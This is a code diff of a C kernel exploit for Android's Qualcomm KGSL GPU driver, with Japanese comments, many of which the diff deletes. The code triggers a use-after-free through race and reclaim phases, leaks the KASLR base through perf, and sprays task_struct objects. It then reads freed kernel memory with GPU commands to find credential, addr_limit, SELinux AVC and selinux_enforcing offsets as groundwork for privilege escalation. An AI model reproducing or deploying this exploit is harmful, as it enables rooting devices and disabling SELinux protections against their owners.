@@ -1,4 +1,5 @@
 
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -198,10 +199,10 @@ static uint64_t kbase = 0;   /* KASLR ベース */
 typedef struct {
     uint64_t kbase;
     uint64_t init_cred_addr;
-    uint64_t selinux_enforcing_addr;   /* /proc/kallsyms またはフォールバック */
-    int     task_comm_offset;          /* task_struct 内の comm オフセット */
-    int     addr_limit_offset;         /* addr_limit オフセット */
-    int     cred_offset;               /* cred ポインタのオフセット */
+    uint64_t selinux_enforcing_addr;
+    int     task_comm_offset;
+    int     addr_limit_offset;
+    int     cred_offset;
     int     avc_ssid_offset;
     int     avc_tsid_offset;
     int     avc_tclass_offset;
@@ -337,17 +338,25 @@ static uint64_t detect_kaslr_perf(void) {
 
     if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }
 
-    /* テキストセクションの開始アドレスはカーネルバージョンに依存するが、
-       ここでは仮の値として 0xffffffc010080000 を使うが、正確には /proc/kallsyms 等から取得すべき。
-       しかし、perf で得られる IP は動的で、テキスト開始からのオフセットが分からない。
-       そこで、まず /proc/kallsyms を読んで _text シンボルを探すか、既知のオフセットを使う。
-       今回は既知のオフセット (0xffffffc010080000) を使い、KASLR を計算する。
-       移植時にはこの定数を適切に設定するか、/proc/kallsyms から動的に取得する。
-    */
-    uint64_t text_base = 0xffffffc010080000ULL;  /* ARM64 典型的な値 */
+    /* テキストセクションの開始アドレスはカーネルバージョン依存 */
+    uint64_t text_base = 0xffffffc010080000ULL;  /* ARM64 典型的な値 (要確認) */
     uint64_t kaslr = (first_kernel_ip - text_base) & ~0x1FFFFFULL;
     printf("    first_kernel_ip=0x%lX kaslr=0x%lX\n", (unsigned long)first_kernel_ip, (unsigned long)kaslr);
     return kaslr;
+}
+
+/* ============ avc_entries (追加) ============ */
+static int avc_entries(void) {
+    int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
+    if (fd < 0) return -1;
+    char buf[256];
+    ssize_t n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0) return -1;
+    buf[n] = 0;
+    int e = -1;
+    if (sscanf(buf, "entries: %d", &e) != 1) return -1;
+    return e;
 }
 
 /* ============ オフセット検出 ============ */
@@ -362,7 +371,6 @@ static int detect_task_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     int dw;
     unsigned int ts;
 
-    /* UAF 範囲をスキャンしてマーカー文字列を探す */
     for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
@@ -382,11 +390,9 @@ static int detect_task_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
         if (wait_timestamp(ctx_id, ts) < 0) break;
         __sync_synchronize();
 
-        /* マーカー文字列 "TASKUAF!!" を検索 */
         int found = 0;
         for (int off = 0; off < SCAN_DWORDS - 8; off++) {
             if (data[off] == 0x4B534154 && data[off+1] == 0x21464155) {
-                /* comm オフセット = off * 4 (ページ内オフセット) */
                 out->task_comm_offset = off * 4;
                 found = 1;
                 printf("  [TASK] comm offset = 0x%x\n", out->task_comm_offset);
@@ -394,17 +400,9 @@ static int detect_task_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
             }
         }
         if (found) {
-            /* addr_limit は comm から逆算できないので、別途スキャン:
-               addr_limit は通常 0x40 だが、正確には 0x40 が一般的。
-               ここでは comm オフセットから推測するのが難しいので、既知の値 0x40 を仮定し、
-               検証のためにスキャンする。
-            */
-            /* ここでは簡易的に 0x40 を設定するが、実際には comm オフセット - 0x7d8 などで計算可能 */
-            out->addr_limit_offset = 0x40;  /* 多くのカーネルで固定 */
-            printf("  [TASK] addr_limit assumed offset = 0x%x (verify with kernel version)\n", out->addr_limit_offset);
-
-            /* cred ポインタのオフセットも同様に、通常 0x740 だが、comm オフセットと比較 */
-            out->cred_offset = 0x740;  /* 典型的な値 */
+            out->addr_limit_offset = 0x40;
+            printf("  [TASK] addr_limit assumed offset = 0x%x\n", out->addr_limit_offset);
+            out->cred_offset = 0x740;
             printf("  [TASK] cred pointer assumed offset = 0x%x\n", out->cred_offset);
             return 1;
         }
@@ -413,7 +411,7 @@ static int detect_task_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     return 0;
 }
 
-/* 2. AVC ノードのオフセットを特定 (UAF ページに AVC ノードが配置された後に実行) */
+/* 2. AVC ノードのオフセットを特定 */
 static int detect_avc_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                               void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                               offsets_t *out) {
@@ -423,16 +421,12 @@ static int detect_avc_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     int dw;
     unsigned int ts;
 
-    /* まず AVC ノードを UAF ページに載せるために churn を実行 */
-    // ここでは簡略化のため、既に churn が行われていると仮定。
-
-    /* 全 UAF ページをスキャンし、ssid が 1..0x3fff で tsid==2, tclass==1 のパターンを探す */
     for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
         dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < 256; i++) {  /* 1ページ分だけスキャン (avc_node は 72バイト間隔) */
+        for (int i = 0; i < 256; i++) {
             uint32_t dl, dh, sl, sh;
             split64(dst_ga + i * 4, &dl, &dh);
             split64(va + i * 4, &sl, &sh);
@@ -446,29 +440,24 @@ static int detect_avc_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
         if (wait_timestamp(ctx_id, ts) < 0) break;
         __sync_synchronize();
 
-        /* データから AVC ノードの可能性を探す (avc_node は 72 バイト単位) */
         for (int off = 0; off < 4096 - 72; off += 4) {
             uint32_t *p = &data[off/4];
-            /* 候補: ssid, tsid, tclass が連続する可能性 */
-            /* 実際には ssid は 4バイト、tsid は 4バイト、tclass は 2バイト。
-               ここでは 4バイト単位で見るため、tclass は下位16ビットと仮定 */
             uint32_t ssid = p[0];
             uint32_t tsid = p[1];
             uint16_t tclass = (uint16_t)(p[2] & 0xffff);
             if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
-                /* 見つかった: このオフセットが avc_node の先頭からの ssid オフセット */
-                out->avc_ssid_offset = 0;  /* 先頭が ssid と仮定 */
+                out->avc_ssid_offset = 0;
                 out->avc_tsid_offset = 4;
                 out->avc_tclass_offset = 8;
-                out->avc_allowed_offset = 12;  /* allowed は tclass の後 4バイト */
+                out->avc_allowed_offset = 12;
                 printf("  [AVC] ssid offset = 0x%x, tsid = 0x%x, tclass = 0x%x, allowed = 0x%x\n",
-                       out->avc_ssid_offset, out->avc_tsid_offset, out->avc_tclass_offset, out->avc_allowed_offset);
+                       out->avc_ssid_offset, out->avc_tsid_offset,
+                       out->avc_tclass_offset, out->avc_allowed_offset);
                 return 1;
             }
         }
     }
     printf("  [-] Could not find AVC node pattern\n");
-    /* フォールバック: 標準的なオフセットを返す */
     out->avc_ssid_offset = 0;
     out->avc_tsid_offset = 4;
     out->avc_tclass_offset = 8;
@@ -479,7 +468,6 @@ static int detect_avc_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
 /* 3. selinux_enforcing アドレスを取得 */
 static uint64_t get_selinux_enforcing_addr(void) {
     printf("[*] Getting selinux_enforcing address...\n");
-    /* まず /proc/kallsyms を試す */
     int fd = open("/proc/kallsyms", O_RDONLY);
     if (fd >= 0) {
         char buf[4096];
@@ -503,8 +491,6 @@ static uint64_t get_selinux_enforcing_addr(void) {
         }
         close(fd);
     }
-    /* 読めない場合、KASLR + 既知のオフセットを使用 (vmlinux から取得) */
-    /* ここでは固定オフセットを使わざるを得ないが、できるだけ避けたい */
     printf("  [-] /proc/kallsyms not readable, using fallback offset\n");
     if (kbase) {
         uint64_t addr = kbase + 0x01240744cULL;  /* 典型的なオフセット (要調整) */
@@ -514,7 +500,7 @@ static uint64_t get_selinux_enforcing_addr(void) {
     return 0;
 }
 
-/* ============ Phase 1-4: UAF トリガー (既存) ============ */
+/* ============ Phase 1-4: UAF トリガー ============ */
 static void phase1_rbtree(void) {
     alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
@@ -582,7 +568,7 @@ static void phase4_reclaim(void) {
     usleep(10000);
 }
 
-/* ============ チャーン (AVC miss 生成) ============ */
+/* ============ チャーン ============ */
 static const char *churn_dirs[] = {
     "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
     "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
@@ -679,7 +665,6 @@ int main(int argc, char **argv) {
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    /* 1. KASLR 検出 */
     printf("[*] Phase 0: KASLR detection\n");
     kbase = detect_kaslr_perf();
     if (kbase == 0) {
@@ -689,14 +674,12 @@ int main(int argc, char **argv) {
     }
     detected.kbase = kbase;
 
-    /* 2. UAF トリガー */
     printf("[*] Phase 1-4: Trigger UAF\n");
     phase1_rbtree();
     if (!phase2_race()) { close(kgsl_fd); return 1; }
     phase3_free_uaf();
     phase4_reclaim();
 
-    /* 3. task_struct スプレー */
     spawn_spray();
 
     unsigned int ctx_id = create_context();
@@ -714,33 +697,27 @@ int main(int argc, char **argv) {
 
     printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);
 
-    /* 4. task_struct オフセット検出 */
     if (!detect_task_offsets(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &detected)) {
         printf("[-] Task offset detection failed\n");
         goto cleanup;
     }
 
-    /* 5. kill して AVC ノード用にページを解放 */
     kill_spray_children();
     usleep(100000);
 
-    /* 6. churn で AVC ノードを UAF ページに載せる */
     churn_build();
     for (int c = 0; c < 5; c++) churn_round();
     printf("[AVC] entries=%d\n", avc_entries());
 
-    /* 7. AVC オフセット検出 */
     if (!detect_avc_offsets(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &detected)) {
         printf("[-] AVC offset detection failed (using defaults)\n");
     }
 
-    /* 8. selinux_enforcing アドレス取得 */
     detected.selinux_enforcing_addr = get_selinux_enforcing_addr();
 
-    /* 9. 結果表示 */
     printf("\n========== Detected Offsets ==========\n");
     printf("KASLR base            : 0x%lx\n", (unsigned long)detected.kbase);
-    printf("init_cred             : 0x%lx (calculated)\n", (unsigned long)(detected.kbase + 0x012D97D08ULL)); /* 仮 */
+    printf("init_cred             : 0x%lx (calculated)\n", (unsigned long)(detected.kbase + 0x012D97D08ULL));
     printf("selinux_enforcing     : 0x%lx\n", (unsigned long)detected.selinux_enforcing_addr);
     printf("task_struct.comm      : 0x%x\n", detected.task_comm_offset);
     printf("task_struct.addr_limit: 0x%x\n", detected.addr_limit_offset);
